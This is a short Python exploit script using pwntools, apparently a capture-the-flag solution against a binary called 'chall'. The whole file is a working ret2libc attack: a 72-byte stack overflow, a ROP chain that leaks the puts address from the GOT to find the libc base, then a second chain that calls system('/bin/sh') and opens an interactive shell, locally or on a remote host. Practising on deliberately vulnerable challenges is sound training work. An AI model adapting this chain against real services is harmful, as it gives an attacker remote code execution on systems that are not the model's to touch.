#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("./libc.so.6")
HOST, PORT = "HOST", 1337
OFFSET = 72

io = remote(HOST, PORT) if args.REMOTE else process(elf.path)
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

payload = flat(
    b"A" * OFFSET,
    pop_rdi, elf.got["puts"],
    elf.plt["puts"],
    elf.sym["main"],
)
io.sendlineafter(b"> ", payload)
leak = u64(io.recvline().strip().ljust(8, b"\0"))
libc.address = leak - libc.sym["puts"]
log.info(f"libc={hex(libc.address)}")

payload = flat(
    b"A" * OFFSET,
    ret,
    pop_rdi, next(libc.search(b"/bin/sh")),
    libc.sym["system"],
)
io.sendlineafter(b"> ", payload)
io.interactive()

